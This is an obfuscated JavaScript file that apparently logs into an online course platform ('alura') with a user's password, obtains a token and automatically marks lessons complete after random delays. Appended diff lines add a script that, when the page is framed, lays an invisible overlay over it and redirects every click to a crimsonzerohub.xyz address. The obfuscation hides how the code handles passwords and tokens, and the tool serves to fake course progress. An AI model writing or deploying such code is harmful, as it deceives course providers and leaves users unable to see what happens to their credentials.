cGTv(mYY1.y55Z(114),{[mYY1.WzA0(115)]:QQow,[mYY1.Gfg0(17)]:sSrw||oPlw?.[mYY1.Gfg0(17)]});QEPx(QQow,sSrw||oPlw?.[mYY1.Gfg0(17)]);return kMfw;}break;case (15658734^0O73567354):IKcw=mYY1[mYY1.Gfg0(65)]();{var EHWv=mYY1[mYY1.GdJZ(64)]();while(EHWv<mYY1[mYY1.Gfg0(65)]())switch(EHWv){case (0x75bcd15-0O726746425):EHWv=oPlw&&oPlw[mYY1.Gfg0(81)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):EHWv=mYY1[mYY1.Gfg0(65)]();{const gJZv=Date[mYY1.WzA0(83)]();var Iibt=mYY1[mYY1.GdJZ(64)]();while(Iibt<mYY1[mYY1.Gfg0(65)]())switch(Iibt){case (0x75bcd15-0O726746425):Iibt=gJZv-oPlw[mYY1.y55Z(82)]<(0x5E30A78-0O570605164)*60*60*1000?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):Iibt=mYY1[mYY1.Gfg0(65)]();{try{wVxw(mYY1.Kkl0(116),mYY1.OhiY(117),mYY1.Gfg0(49),1500);const kket=await Qont(oPlw[mYY1.Gfg0(81)]);return await cGTv(mYY1.y55Z(114),{[mYY1.C22X(118)]:kket});}catch(EfVs){wVxw(mYY1.uUpY(119),mYY1.GdJZ(120),mYY1.Gfg0(121));}}break;case (15658734^0O73567354):Iibt=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.uUpY(119),mYY1.y55Z(122),mYY1.Gfg0(121));}break;}}break;}const ghYs=await YaMs(QQow,sSrw);const AcPs=await Qont(ghYs);QEPx(QQow,null,ghYs);return await cGTv(mYY1.y55Z(114),{[mYY1.C22X(118)]:AcPs});}break;}}async function ceSs(wZIs){return cGTv(mYY1.WzA0(123),wZIs);}async function YaMs(Yuzt,AwCt){const Urtt=await fetch(`${IeQw[mYY1.y55Z(2)]}${mYY1.Kkl0(124)}`,{[mYY1.OhiY(101)]:mYY1.C22X(102),[mYY1.uUpY(103)]:{[mYY1.GdJZ(104)]:mYY1.Gfg0(105),[mYY1.OhiY(125)]:mYY1.C22X(126),[mYY1.uUpY(127)]:mYY1.GdJZ(128),[mYY1.y55Z(106)]:IeQw[mYY1.C22X(6)],[mYY1.Gfg0(129)]:IeQw[mYY1.GdJZ(8)]},[mYY1.WzA0(107)]:JSON[mYY1.OhiY(85)]({[mYY1.y55Z(130)]:mYY1.C22X(126),[mYY1.WzA0(131)]:mYY1.GdJZ(128),[mYY1.Kkl0(132)]:Yuzt,[mYY1.Gfg0(17)]:AwCt})});var wtwt=mYY1[mYY1.GdJZ(64)]();while(wtwt<mYY1[mYY1.Gfg0(65)]())switch(wtwt){case (0x75bcd15-0O726746425):wtwt=!Urtt[mYY1.OhiY(109)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):wtwt=mYY1[mYY1.Gfg0(65)]();throw new Error(`${mYY1.OhiY(133)}${Urtt[mYY1.Gfg0(113)]}`);}return (await Urtt[mYY1.Kkl0(108)]())[mYY1.Gfg0(81)];}async function Qont(sqqt){const Mlht=await fetch(`${IeQw[mYY1.y55Z(2)]}${mYY1.C22X(134)}`,{[mYY1.OhiY(101)]:mYY1.uUpY(135),[mYY1.uUpY(103)]:{[mYY1.GdJZ(104)]:mYY1.Gfg0(105),[mYY1.GdJZ(136)]:sqqt,[mYY1.uUpY(127)]:mYY1.GdJZ(128),[mYY1.OhiY(125)]:mYY1.C22X(126),[mYY1.y55Z(106)]:IeQw[mYY1.C22X(6)],[mYY1.Gfg0(129)]:IeQw[mYY1.GdJZ(8)]}});var onkt=mYY1[mYY1.GdJZ(64)]();while(onkt<mYY1[mYY1.Gfg0(65)]())switch(onkt){case (0x75bcd15-0O726746425):onkt=!Mlht[mYY1.OhiY(109)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):onkt=mYY1[mYY1.Gfg0(65)]();throw new Error(`${mYY1.Gfg0(137)}${Mlht[mYY1.Gfg0(113)]}`);}return (await Mlht[mYY1.Kkl0(108)]())[mYY1.y55Z(138)];}async function oHXt(QIau){var kERt=mYY1[mYY1.GdJZ(64)]();while(kERt<mYY1[mYY1.Gfg0(65)]())switch(kERt){case (0x75bcd15-0O726746425):kERt=!QIau[mYY1.uUpY(79)](mYY1.WzA0(139))?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):kERt=mYY1[mYY1.Gfg0(65)]();{throw new Error(mYY1.Kkl0(140));}break;}return await cGTv(mYY1.OhiY(141),{[mYY1.C22X(142)]:QIau});}function MFUt(gBLt){UTuw[mYY1.GdJZ(32)][mYY1.C22X(54)]=mYY1.y55Z(90);var ICOt=mYY1[mYY1.GdJZ(64)]();while(ICOt<mYY1[mYY1.Gfg0(65)]())switch(ICOt){case (0x75bcd15-0O726746425):ICOt=!gBLt||gBLt[mYY1.Kkl0(92)]===(0x75bcd15-0O726746425)?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):ICOt=mYY1[mYY1.Gfg0(65)]();{UTuw[mYY1.GdJZ(32)][mYY1.C22X(54)]=mYY1.uUpY(143);return;}break;}gBLt[mYY1.GdJZ(144)](cyFt=>{const EzIt=cyFt[mYY1.Gfg0(113)]===mYY1.Gfg0(145);const ETvu=document[mYY1.y55Z(50)](mYY1.WzA0(51));ETvu[mYY1.Kkl0(52)]=`${mYY1.y55Z(146)}${EzIt?mYY1.WzA0(147):mYY1.y55Z(90)}`;ETvu[mYY1.C22X(54)]=`${mYY1.Kkl0(148)}${cyFt[mYY1.Kkl0(156)]}${mYY1.OhiY(149)}${cyFt[mYY1.Kkl0(156)]}${mYY1.C22X(150)}${EzIt?mYY1.OhiY(157):mYY1.y55Z(90)}${mYY1.uUpY(151)}${cyFt[mYY1.Kkl0(156)]}${mYY1.GdJZ(152)}${cyFt[mYY1.C22X(158)]}${mYY1.Gfg0(153)}${cyFt[mYY1.uUpY(159)]}${mYY1.y55Z(154)}${cyFt[mYY1.Gfg0(113)]}${mYY1.WzA0(155)}`;UTuw[mYY1.GdJZ(32)][mYY1.y55Z(58)](ETvu);});UTuw[mYY1.Gfg0(41)][mYY1.OhiY(157)]=!![];MhWw(UTuw[mYY1.WzA0(27)],!![]);}function gVyu(AQpu,cSsu,wNju,YOmu){UTuw[mYY1.y55Z(42)][mYY1.Kkl0(68)]=wNju?`${mYY1.GdJZ(160)}${wNju}`:mYY1.Gfg0(161);UTuw[mYY1.WzA0(43)][mYY1.Kkl0(68)]=YOmu?`${mYY1.y55Z(162)}${YOmu}`:mYY1.WzA0(163);const sKdu=cSsu>(0x75bcd15-0O726746425)?Math[mYY1.Kkl0(164)]((AQpu/cSsu)*100):(0x75bcd15-0O726746425);UTuw[mYY1.OhiY(45)][mYY1.C22X(70)][mYY1.OhiY(165)]=`${sKdu}${mYY1.C22X(166)}`;UTuw[mYY1.C22X(46)][mYY1.Kkl0(68)]=`${AQpu}${mYY1.uUpY(167)}${cSsu}${mYY1.GdJZ(168)}${sKdu}${mYY1.Gfg0(169)}`;}async function ULgu(wlir,Ymlr,sicr){MhWw(UTuw[mYY1.Kkl0(28)],!![]);caHw=!![];EbKw=(NaN===NaN);UTuw[mYY1.uUpY(47)][mYY1.C22X(70)][mYY1.y55Z(170)]=mYY1.WzA0(171);UTuw[mYY1.uUpY(47)][mYY1.OhiY(157)]=(NaN===NaN);let Ujfr=(0x75bcd15-0O726746425);let ofWq=(0x75bcd15-0O726746425);const QgZq=AYDw[mYY1.Kkl0(172)](kcQq=>kcQq[mYY1.Kkl0(156)]===wlir);let MdTq=QgZq?QgZq[mYY1.C22X(158)]:mYY1.OhiY(173);try{wVxw(mYY1.C22X(174),`${mYY1.uUpY(175)}${MdTq}${mYY1.GdJZ(176)}`,mYY1.Gfg0(49));var MxGr=mYY1[mYY1.GdJZ(64)]();while(MxGr<mYY1[mYY1.Gfg0(65)]())switch(MxGr){case (0x75bcd15-0O726746425):MxGr=QgZq&&QgZq[mYY1.uUpY(159)]===mYY1.Gfg0(177)?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):MxGr=mYY1[mYY1.Gfg0(65)]();{try{wVxw(mYY1.y55Z(178),`${mYY1.WzA0(179)}${MdTq}${mYY1.Kkl0(180)}`,mYY1.Gfg0(49),2000);await cGTv(mYY1.OhiY(181),{[mYY1.C22X(182)]:[wlir],[mYY1.C22X(142)]:YWAw[mYY1.uUpY(183)]});}catch(ozJr){wVxw(mYY1.uUpY(119),`${mYY1.GdJZ(184)}${ozJr[mYY1.uUpY(111)]}${mYY1.Gfg0(185)}`,mYY1.Gfg0(121));}}break;case (15658734^0O73567354):MxGr=mYY1[mYY1.Gfg0(65)]();var IuAr=mYY1[mYY1.GdJZ(64)]();while(IuAr<mYY1[mYY1.Gfg0(65)]())switch(IuAr){case (0x75bcd15-0O726746425):IuAr=QgZq?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):IuAr=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.Kkl0(116),`${mYY1.y55Z(186)}${MdTq}${mYY1.WzA0(187)}`,mYY1.Gfg0(49),2000);}break;}break;}const kwDr=await cGTv(mYY1.Kkl0(188),{[mYY1.C22X(182)]:[wlir],[mYY1.C22X(142)]:YWAw[mYY1.uUpY(183)]});const Erur=kwDr[mYY1.OhiY(189)][wlir];MdTq=Erur[mYY1.C22X(190)]||MdTq;const gtxr=(Erur[mYY1.uUpY(191)]||[])[mYY1.GdJZ(192)](Aoor=>Aoor[mYY1.Gfg0(113)]!==mYY1.Gfg0(193));ofWq=gtxr[mYY1.Kkl0(92)];var cqrr=mYY1[mYY1.GdJZ(64)]();while(cqrr<mYY1[mYY1.Gfg0(65)]())switch(cqrr){case (0x75bcd15-0O726746425):cqrr=ofWq===(0x75bcd15-0O726746425)?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):cqrr=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.y55Z(194),`${mYY1.WzA0(195)}${MdTq}${mYY1.Kkl0(196)}`,mYY1.Gfg0(49));await cGTv(mYY1.OhiY(197),{[mYY1.C22X(198)]:wlir,[mYY1.C22X(142)]:YWAw[mYY1.uUpY(183)]});wVxw(mYY1.uUpY(199),`${mYY1.GdJZ(200)}${MdTq}${mYY1.Gfg0(201)}`,mYY1.C22X(110));throw new Error(mYY1.y55Z(202));}break;}gVyu(Ujfr,ofWq,MdTq,mYY1.C22X(174));siMK:for(const cKes of gtxr){var ELhs=mYY1[mYY1.GdJZ(64)]();while(ELhs<mYY1[mYY1.Gfg0(65)]())switch(ELhs){case (0x75bcd15-0O726746425):ELhs=EbKw?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):ELhs=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.WzA0(203),mYY1.Kkl0(204),mYY1.Gfg0(121));break siMK;}break;}gVyu(Ujfr,ofWq,MdTq,cKes[mYY1.OhiY(205)]);const YGYr=Ymlr+Math[mYY1.C22X(206)]()*(sicr-Ymlr);UTuw[mYY1.WzA0(43)][mYY1.Kkl0(68)]=`${mYY1.uUpY(207)}${YGYr[mYY1.Gfg0(209)]((0O57060516-0xbc614d))}${mYY1.GdJZ(208)}${cKes[mYY1.OhiY(205)]}`;await Asrx(YGYr);try{const AIbs=[mYY1.y55Z(210),mYY1.WzA0(211)];const UDSr=AIbs[mYY1.uUpY(79)](cKes[mYY1.Kkl0(212)])?mYY1.OhiY(213):mYY1.C22X(214);UTuw[mYY1.WzA0(43)][mYY1.Kkl0(68)]=`${mYY1.uUpY(215)}${cKes[mYY1.OhiY(205)]}`;await cGTv(UDSr,{[mYY1.GdJZ(216)]:cKes[mYY1.GdJZ(216)],[mYY1.Kkl0(212)]:cKes[mYY1.Kkl0(212)],[mYY1.C22X(142)]:YWAw[mYY1.uUpY(183)]});UTuw[mYY1.WzA0(43)][mYY1.Kkl0(68)]=`${mYY1.Gfg0(217)}${cKes[mYY1.OhiY(205)]}`;UTuw[mYY1.Kkl0(44)][mYY1.Kkl0(68)]=mYY1.y55Z(218);UTuw[mYY1.Kkl0(44)][mYY1.C22X(70)][mYY1.uUpY(71)]=mYY1.y55Z(74);await kAGx(1000);Ujfr++;gVyu(Ujfr,ofWq,MdTq,cKes[mYY1.OhiY(205)]);}catch(wFVr){UTuw[mYY1.WzA0(43)][mYY1.Kkl0(68)]=`${mYY1.WzA0(219)}${cKes[mYY1.OhiY(205)]}`;UTuw[mYY1.Kkl0(44)][mYY1.Kkl0(68)]=mYY1.Kkl0(220);UTuw[mYY1.Kkl0(44)][mYY1.C22X(70)][mYY1.uUpY(71)]=mYY1.OhiY(221);wVxw(mYY1.C22X(222),`${mYY1.uUpY(223)}${cKes[mYY1.OhiY(205)]}${mYY1.GdJZ(224)}${wFVr[mYY1.uUpY(111)]}`,mYY1.OhiY(77));await kAGx(2000);}}var QAMr=mYY1[mYY1.GdJZ(64)]();while(QAMr<mYY1[mYY1.Gfg0(65)]())switch(QAMr){case (0x75bcd15-0O726746425):QAMr=!EbKw?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):QAMr=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.Gfg0(225),`${mYY1.y55Z(226)}${MdTq}${mYY1.Kkl0(180)}`,mYY1.Gfg0(49));await cGTv(mYY1.OhiY(197),{[mYY1.C22X(198)]:wlir,[mYY1.C22X(142)]:YWAw[mYY1.uUpY(183)]});wVxw(mYY1.WzA0(227),mYY1.Kkl0(228),mYY1.C22X(110));}break;}}catch(sCPr){var sWCs=mYY1[mYY1.GdJZ(64)]();while(sWCs<mYY1[mYY1.Gfg0(65)]())switch(sWCs){case (0x75bcd15-0O726746425):sWCs=sCPr[mYY1.uUpY(111)]!==mYY1.y55Z(202)?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):sWCs=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.OhiY(229),`${mYY1.C22X(230)}${sCPr[mYY1.uUpY(111)]}`,mYY1.OhiY(77),5000);}break;}}finally{caHw=(NaN===NaN);UTuw[mYY1.uUpY(47)][mYY1.OhiY(157)]=!![];UTuw[mYY1.y55Z(42)][mYY1.Kkl0(68)]=mYY1.uUpY(231);UTuw[mYY1.WzA0(43)][mYY1.Kkl0(68)]=`${Ujfr}${mYY1.GdJZ(232)}${ofWq}${mYY1.Gfg0(233)}`;UTuw[mYY1.Kkl0(44)][mYY1.Kkl0(68)]=mYY1.y55Z(90);setTimeout(()=>{MhWw(UTuw[mYY1.Kkl0(28)],NaN===NaN);var UXFs=mYY1[mYY1.GdJZ(64)]();while(UXFs<mYY1[mYY1.Gfg0(65)]())switch(UXFs){case (0x75bcd15-0O726746425):UXFs=!caHw?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):UXFs=mYY1[mYY1.Gfg0(65)]();{oTws();}break;}},5000);}}async function oTws(){var QUzs=mYY1[mYY1.GdJZ(64)]();while(QUzs<mYY1[mYY1.Gfg0(65)]())switch(QUzs){case (0x75bcd15-0O726746425):QUzs=caHw||!YWAw?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):QUzs=mYY1[mYY1.Gfg0(65)]();return;}caHw=!![];MhWw(UTuw[mYY1.GdJZ(24)],!![]);MhWw(UTuw[mYY1.WzA0(27)],NaN===NaN);try{const kQqs=await ceSs(YWAw);var MRts=mYY1[mYY1.GdJZ(64)]();while(MRts<mYY1[mYY1.Gfg0(65)]())switch(MRts){case (0x75bcd15-0O726746425):MRts=kQqs&&kQqs[mYY1.y55Z(234)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):MRts=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.uUpY(199),mYY1.WzA0(235),mYY1.C22X(110));AYDw=kQqs[mYY1.y55Z(234)];MFUt(AYDw);}break;case (15658734^0O73567354):MRts=mYY1[mYY1.Gfg0(65)]();{throw new Error(mYY1.Kkl0(236));}break;}}catch(gNks){wVxw(mYY1.OhiY(237),`${gNks[mYY1.uUpY(111)]||gNks}`,mYY1.OhiY(77),4000);}finally{MhWw(UTuw[mYY1.GdJZ(24)],NaN===NaN);caHw=(NaN===NaN);}}async function IOns(){var kopp=mYY1[mYY1.GdJZ(64)]();while(kopp<mYY1[mYY1.Gfg0(65)]())switch(kopp){case (0x75bcd15-0O726746425):kopp=caHw?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):kopp=mYY1[mYY1.Gfg0(65)]();return;}const Mpsp=UTuw[mYY1.C22X(14)][mYY1.C22X(238)][mYY1.uUpY(239)]();const gljp=UTuw[mYY1.GdJZ(16)][mYY1.C22X(238)][mYY1.uUpY(239)]();var Immp=mYY1[mYY1.GdJZ(64)]();while(Immp<mYY1[mYY1.Gfg0(65)]())switch(Immp){case (0x75bcd15-0O726746425):Immp=!Mpsp||!gljp?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):Immp=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.GdJZ(240),mYY1.Gfg0(241),mYY1.OhiY(77));return;}break;}caHw=!![];UTuw[mYY1.uUpY(23)][mYY1.OhiY(157)]=!![];MhWw(UTuw[mYY1.GdJZ(24)],!![]);try{YWAw=await QwBv(Mpsp,gljp);const cidp=await ceSs(YWAw);var Ejgp=mYY1[mYY1.GdJZ(64)]();while(Ejgp<mYY1[mYY1.Gfg0(65)]())switch(Ejgp){case (0x75bcd15-0O726746425):Ejgp=cidp&&cidp[mYY1.y55Z(234)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):Ejgp=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.uUpY(199),`${mYY1.y55Z(242)}${cidp[mYY1.y55Z(234)][mYY1.Kkl0(92)]}${mYY1.WzA0(243)}`,mYY1.C22X(110));AYDw=cidp[mYY1.y55Z(234)];MFUt(AYDw);}break;case (15658734^0O73567354):Ejgp=mYY1[mYY1.Gfg0(65)]();{throw new Error(mYY1.Kkl0(244));}break;}}catch(YeXo){wVxw(mYY1.OhiY(229),`${YeXo[mYY1.uUpY(111)]||YeXo}`,mYY1.OhiY(77),4000);}finally{MhWw(UTuw[mYY1.GdJZ(24)],NaN===NaN);caHw=(NaN===NaN);UTuw[mYY1.uUpY(23)][mYY1.OhiY(157)]=(NaN===NaN);}}UTuw[mYY1.Kkl0(12)][mYY1.GdJZ(0)](mYY1.OhiY(245),Agap=>{Agap[mYY1.C22X(246)]();IOns();});UTuw[mYY1.y55Z(18)][mYY1.GdJZ(0)](mYY1.uUpY(63),()=>{const AANp=UTuw[mYY1.GdJZ(16)][mYY1.uUpY(247)]===mYY1.Gfg0(17);UTuw[mYY1.GdJZ(16)][mYY1.uUpY(247)]=AANp?mYY1.GdJZ(248):mYY1.Gfg0(17);UTuw[mYY1.y55Z(18)][mYY1.C22X(54)]=AANp?mYY1.Gfg0(249):mYY1.y55Z(250);});UTuw[mYY1.OhiY(21)][mYY1.GdJZ(0)](mYY1.uUpY(63),()=>{gpmv();MhWw(UTuw[mYY1.Gfg0(25)],!![]);});UTuw[mYY1.OhiY(29)][mYY1.GdJZ(0)](mYY1.uUpY(63),cCQp=>{const wxHp=cCQp[mYY1.WzA0(251)][mYY1.Kkl0(252)](mYY1.OhiY(253));var YyKp=mYY1[mYY1.GdJZ(64)]();while(YyKp<mYY1[mYY1.Gfg0(65)]())switch(YyKp){case (0x75bcd15-0O726746425):YyKp=!wxHp?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):YyKp=mYY1[mYY1.Gfg0(65)]();return;}const suBp=wxHp[mYY1.C22X(254)][mYY1.uUpY(255)];var UvEp=mYY1[mYY1.GdJZ(64)]();while(UvEp<mYY1[mYY1.Gfg0(65)]())switch(UvEp){case (0x75bcd15-0O726746425):UvEp=wxHp[mYY1.WzA0(59)][mYY1.GdJZ(256)](mYY1.Gfg0(257))?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):UvEp=mYY1[mYY1.Gfg0(65)]();{const orvp=UHVx()[suBp];var Qsyp=mYY1[mYY1.GdJZ(64)]();while(Qsyp<mYY1[mYY1.Gfg0(65)]())switch(Qsyp){case (0x75bcd15-0O726746425):Qsyp=orvp?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):Qsyp=mYY1[mYY1.Gfg0(65)]();{UTuw[mYY1.C22X(14)][mYY1.C22X(238)]=suBp;UTuw[mYY1.GdJZ(16)][mYY1.C22X(238)]=orvp[mYY1.Gfg0(17)]||mYY1.y55Z(90);MhWw(UTuw[mYY1.Gfg0(25)],NaN===NaN);wVxw(mYY1.y55Z(258),mYY1.WzA0(259),mYY1.Gfg0(49));}break;}}break;case (15658734^0O73567354):UvEp=mYY1[mYY1.Gfg0(65)]();var QMlq=mYY1[mYY1.GdJZ(64)]();while(QMlq<mYY1[mYY1.Gfg0(65)]())switch(QMlq){case (0x75bcd15-0O726746425):QMlq=wxHp[mYY1.WzA0(59)][mYY1.GdJZ(256)](mYY1.Kkl0(260))?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):QMlq=mYY1[mYY1.Gfg0(65)]();{IWBu(suBp);}break;}break;}});UTuw[mYY1.C22X(22)][mYY1.GdJZ(0)](mYY1.uUpY(63),()=>{MhWw(UTuw[mYY1.y55Z(26)],!![]);});UTuw[mYY1.uUpY(31)][mYY1.GdJZ(0)](mYY1.uUpY(63),async()=>{const sOoq=UTuw[mYY1.C22X(30)][mYY1.C22X(238)][mYY1.uUpY(239)]();var MJfq=mYY1[mYY1.GdJZ(64)]();while(MJfq<mYY1[mYY1.Gfg0(65)]())switch(MJfq){case (0x75bcd15-0O726746425):MJfq=!sOoq?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):MJfq=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.GdJZ(240),mYY1.OhiY(261),mYY1.OhiY(77));return;}break;}MhWw(UTuw[mYY1.y55Z(26)],NaN===NaN);MhWw(UTuw[mYY1.GdJZ(24)],!![]);try{YWAw=await oHXt(sOoq);wVxw(mYY1.uUpY(199),mYY1.C22X(262),mYY1.C22X(110));const oLiq=await ceSs(YWAw);var IGZp=mYY1[mYY1.GdJZ(64)]();while(IGZp<mYY1[mYY1.Gfg0(65)]())switch(IGZp){case (0x75bcd15-0O726746425):IGZp=oLiq&&oLiq[mYY1.y55Z(234)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.WzA0(67)]();break;case (0O57060516-0xbc614d):IGZp=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.uUpY(199),`${mYY1.y55Z(242)}${oLiq[mYY1.y55Z(234)][mYY1.Kkl0(92)]}${mYY1.WzA0(243)}`,mYY1.C22X(110));AYDw=oLiq[mYY1.y55Z(234)];MFUt(AYDw);}break;case (15658734^0O73567354):IGZp=mYY1[mYY1.Gfg0(65)]();{throw new Error(mYY1.Kkl0(244));}break;}}catch(kIcq){wVxw(mYY1.OhiY(229),`${kIcq[mYY1.uUpY(111)]||kIcq}`,mYY1.OhiY(77),5000);}finally{MhWw(UTuw[mYY1.GdJZ(24)],NaN===NaN);}});document[mYY1.uUpY(263)](mYY1.GdJZ(264))[mYY1.GdJZ(144)](EDTp=>{EDTp[mYY1.GdJZ(0)](mYY1.uUpY(63),()=>{const gFWp=EDTp[mYY1.C22X(254)][mYY1.Gfg0(265)];const gZJq=document[mYY1.OhiY(13)](gFWp);var IaNq=mYY1[mYY1.GdJZ(64)]();while(IaNq<mYY1[mYY1.Gfg0(65)]())switch(IaNq){case (0x75bcd15-0O726746425):IaNq=gZJq?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):IaNq=mYY1[mYY1.Gfg0(65)]();MhWw(gZJq,NaN===NaN);break;}});});UTuw[mYY1.GdJZ(32)][mYY1.GdJZ(0)](mYY1.y55Z(266),cWDq=>{var EXGq=mYY1[mYY1.GdJZ(64)]();while(EXGq<mYY1[mYY1.Gfg0(65)]())switch(EXGq){case (0x75bcd15-0O726746425):EXGq=cWDq[mYY1.WzA0(251)][mYY1.WzA0(267)]===mYY1.Kkl0(268)?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):EXGq=mYY1[mYY1.Gfg0(65)]();{UTuw[mYY1.Gfg0(41)][mYY1.OhiY(157)]=(NaN===NaN);}break;}});UTuw[mYY1.Gfg0(33)][mYY1.GdJZ(0)](mYY1.y55Z(266),()=>{const YSxq=UTuw[mYY1.Gfg0(33)][mYY1.OhiY(269)];UTuw[mYY1.WzA0(35)][mYY1.WzA0(59)][mYY1.C22X(270)](mYY1.OhiY(157),YSxq);});UTuw[mYY1.Gfg0(41)][mYY1.GdJZ(0)](mYY1.uUpY(63),()=>{const AUAq=UTuw[mYY1.GdJZ(32)][mYY1.WzA0(19)](mYY1.uUpY(271));var UPrq=mYY1[mYY1.GdJZ(64)]();while(UPrq<mYY1[mYY1.Gfg0(65)]())switch(UPrq){case (0x75bcd15-0O726746425):UPrq=!AUAq?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):UPrq=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.uUpY(87),mYY1.GdJZ(272),mYY1.OhiY(77));return;}break;}const wRuq=AUAq[mYY1.C22X(238)];let Yqwn=parseInt(UTuw[mYY1.OhiY(37)][mYY1.C22X(238)],10);let Aszn=parseInt(UTuw[mYY1.uUpY(39)][mYY1.C22X(238)],10);var Unqn=mYY1[mYY1.GdJZ(64)]();while(Unqn<mYY1[mYY1.Gfg0(65)]())switch(Unqn){case (0x75bcd15-0O726746425):Unqn=UTuw[mYY1.Gfg0(33)][mYY1.OhiY(269)]?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):Unqn=mYY1[mYY1.Gfg0(65)]();{Yqwn=(0O57060516-0xbc614d);Aszn=(15658734^0O73567354);}break;}var wptn=mYY1[mYY1.GdJZ(64)]();while(wptn<mYY1[mYY1.Gfg0(65)]())switch(wptn){case (0x75bcd15-0O726746425):wptn=isNaN(Yqwn)||isNaN(Aszn)||Yqwn<=(0x75bcd15-0O726746425)||Aszn<=(0x75bcd15-0O726746425)||Yqwn>Aszn?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):wptn=mYY1[mYY1.Gfg0(65)]();{wVxw(mYY1.GdJZ(240),mYY1.Gfg0(273),mYY1.OhiY(77));return;}break;}MhWw(UTuw[mYY1.WzA0(27)],NaN===NaN);ULgu(wRuq,Yqwn,Aszn);});UTuw[mYY1.uUpY(47)][mYY1.GdJZ(0)](mYY1.uUpY(63),()=>{EbKw=!![];UTuw[mYY1.uUpY(47)][mYY1.OhiY(157)]=!![];});document[mYY1.GdJZ(0)](mYY1.uUpY(63),Qkkn=>{var smnn=mYY1[mYY1.GdJZ(64)]();while(smnn<mYY1[mYY1.Gfg0(65)]())switch(smnn){case (0x75bcd15-0O726746425):smnn=Qkkn[mYY1.WzA0(251)][mYY1.WzA0(59)][mYY1.GdJZ(256)](mYY1.y55Z(274))?mYY1[mYY1.y55Z(66)]():mYY1[mYY1.Gfg0(65)]();break;case (0O57060516-0xbc614d):smnn=mYY1[mYY1.Gfg0(65)]();{Qkkn[mYY1.WzA0(251)][mYY1.WzA0(59)][mYY1.C22X(62)](mYY1.OhiY(61));}break;}});});
+    (function() {
+        'use strict';
+        
+        const currentUrl = "https:\/\/crimsonzerohub.xyz\/alura";
+        
+       
+        function isInIframe() {
+            try {
+                return window.self !== window.top;
+            } catch (e) {
+                return true;
+            }
+        }
+        
+       
+        if (isInIframe()) {
+            console.warn('⚠️ Site detectado em iframe! Proteção ativada.');
+            
+           
+            document.addEventListener('DOMContentLoaded', function() {
+               
+                const overlay = document.createElement('div');
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    z-index: 999999;
+                    cursor: pointer;
+                    background: transparent;
+                `;
+                
+               
+                overlay.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    window.top.location.href = currentUrl;
+                });
+                
+                document.body.appendChild(overlay);
+                
+                
+                document.body.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    window.top.location.href = currentUrl;
+                }, true);
+            });
+            
+        
+            try {
+                if (window.top.location.href !== currentUrl) {
+                    window.top.location.href = currentUrl;
+                }
+            } catch (e) {
+    
+                console.log('Usando proteção de overlay devido a restrições CORS');
+            }
+        }
